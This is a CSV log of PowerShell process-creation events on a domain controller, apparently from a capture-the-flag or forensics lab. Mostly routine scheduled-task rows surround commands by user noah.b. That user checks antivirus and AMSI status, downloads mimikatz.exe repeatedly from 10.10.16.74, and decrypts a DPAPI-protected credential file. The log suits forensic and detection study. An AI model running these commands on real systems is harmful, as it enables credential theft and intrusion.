"TimeGenerated","Computer","User","Image","CommandLine","ParentImage","ParentCommandLine","ProcessGuid","ParentProcessGuid"
"11/8/2026, 1:37:32.03154 pm","dc.danglingtree.htb","DANGLINGTREE\noah.b","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell  -c ""Test-NetConnection -ComputerName 10.10.16.74 -Port 80""","C:\Windows\System32\cmd.exe","C:\WINDOWS\system32\cmd.exe","7e3eed90-259c-6a7b-3e08-000000003200","7e3eed90-2591-6a7b-3c08-000000003200"
"11/8/2026, 1:37:20.973926 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-2590-6a7b-3708-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 1:36:41.247897 pm","dc.danglingtree.htb","DANGLINGTREE\noah.b","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell  -c ""iwr http://10.10.16.74/test.txt -OutFile C:\Windows\Temp\test.txt""","C:\Windows\System32\cmd.exe","C:\WINDOWS\system32\cmd.exe","7e3eed90-2569-6a7b-3508-000000003200","7e3eed90-24cf-6a7b-1e08-000000003200"
"11/8/2026, 1:36:37.886521 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-2565-6a7b-3108-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:35:39.958569 pm","dc.danglingtree.htb","DANGLINGTREE\noah.b","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell  -c ""iwr http://10.10.16.74/mimikatz.exe -OutFile C:\Windows\Temp\mimikatz.exe""","-","-","7e3eed90-252b-6a7b-2e08-000000003200","00000000-0000-0000-0000-000000000000"
"11/8/2026, 1:35:37.887322 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-2529-6a7b-2a08-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:34:40.916561 pm","dc.danglingtree.htb","DANGLINGTREE\noah.b","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell  -c ""iwr http://10.10.16.74/mimikatz.exe -OutFile C:\Windows\Temp\mimikatz.exe""","C:\Windows\System32\cmd.exe","C:\WINDOWS\system32\cmd.exe","7e3eed90-24f0-6a7b-2508-000000003200","7e3eed90-24cf-6a7b-1e08-000000003200"
"11/8/2026, 1:34:37.885171 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-24ed-6a7b-2108-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:34:06.712866 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-24ce-6a7b-1908-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 1:33:37.887073 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-24b1-6a7b-1408-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:33:15.187851 pm","dc.danglingtree.htb","DANGLINGTREE\noah.b","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell  -c ""iwr http://10.10.16.74/mimikatz.exe -OutFile C:\Windows\Temp\mimikatz.exe""","C:\Windows\System32\cmd.exe","C:\WINDOWS\system32\cmd.exe","7e3eed90-249b-6a7b-1208-000000003200","7e3eed90-240f-6a7b-f707-000000003200"
"11/8/2026, 1:32:59.325211 pm","dc.danglingtree.htb","DANGLINGTREE\noah.b","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell  -c ""Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,AMSIEnabled""","C:\Windows\System32\cmd.exe","C:\WINDOWS\system32\cmd.exe","7e3eed90-248b-6a7b-1008-000000003200","7e3eed90-240f-6a7b-f707-000000003200"
"11/8/2026, 1:32:37.88899 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-2475-6a7b-0c08-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:32:15.696045 pm","dc.danglingtree.htb","DANGLINGTREE\noah.b","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell  -c ""Add-Type -AssemblyName System.Security; $bytes = [System.IO.File]::ReadAllBytes('C:\path\to\credential.bin'); $out = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser'); [System.Text.Encoding]::Unicode.GetString($out)""","C:\Windows\System32\cmd.exe","C:\WINDOWS\system32\cmd.exe","7e3eed90-245f-6a7b-0a08-000000003200","7e3eed90-240f-6a7b-f707-000000003200"
"11/8/2026, 1:31:49.983169 pm","dc.danglingtree.htb","DANGLINGTREE\noah.b","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell  -c ""iwr http://10.10.16.74/mimikatz.exe -OutFile mimikatz.exe""","C:\Windows\System32\cmd.exe","C:\WINDOWS\system32\cmd.exe","7e3eed90-2445-6a7b-0608-000000003200","7e3eed90-240f-6a7b-f707-000000003200"
"11/8/2026, 1:31:37.886991 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-2439-6a7b-fe07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:31:14.529807 pm","dc.danglingtree.htb","DANGLINGTREE\noah.b","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell  -c ""Invoke-WebRequest -Uri http://10.10.16.74/mimikatz.exe -OutFile mimikatz.exe""","C:\Windows\System32\cmd.exe","C:\WINDOWS\system32\cmd.exe","7e3eed90-2422-6a7b-fa07-000000003200","7e3eed90-240f-6a7b-f707-000000003200"
"11/8/2026, 1:30:55.086033 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-240f-6a7b-f207-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 1:30:37.894376 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-23fd-6a7b-ee07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:29:37.889862 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-23c1-6a7b-e807-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:28:37.886815 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-2385-6a7b-e207-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:27:37.887521 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-2349-6a7b-d807-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:26:48.758551 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-2318-6a7b-cf07-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 1:26:37.888265 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-230d-6a7b-cb07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:25:37.888444 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-22d1-6a7b-c507-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:24:37.886668 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-2295-6a7b-bf07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:23:37.887537 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-2259-6a7b-b907-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:22:37.88769 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-221d-6a7b-b207-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:21:37.889993 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-21e1-6a7b-a807-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:20:37.88963 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-21a5-6a7b-a207-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:19:37.885386 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-2169-6a7b-9c07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:18:37.886985 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-212d-6a7b-9607-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:17:37.890161 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-20f1-6a7b-8f07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:16:37.886976 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-20b5-6a7b-8907-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:15:37.893973 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-2079-6a7b-8307-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:14:37.887398 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-203d-6a7b-7d07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:14:23.120013 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-202f-6a7b-7407-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 1:13:37.885949 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-2001-6a7b-6f07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:12:37.886263 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1fc5-6a7b-6807-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:11:37.886912 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1f89-6a7b-5d07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:11:25.056632 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1f7d-6a7b-5607-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 1:10:37.889142 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1f4d-6a7b-5107-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:10:29.89392 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1f45-6a7b-4907-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 1:09:37.886761 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1f11-6a7b-4407-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:08:37.886355 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1ed5-6a7b-3e07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:07:37.887285 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1e99-6a7b-3307-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:07:14.001315 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1e82-6a7b-2c07-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 1:06:37.886585 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1e5d-6a7b-2707-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 1:06:31.222644 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-1e57-6a7b-2307-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 1:05:37.886946 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1e21-6a7b-1d07-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
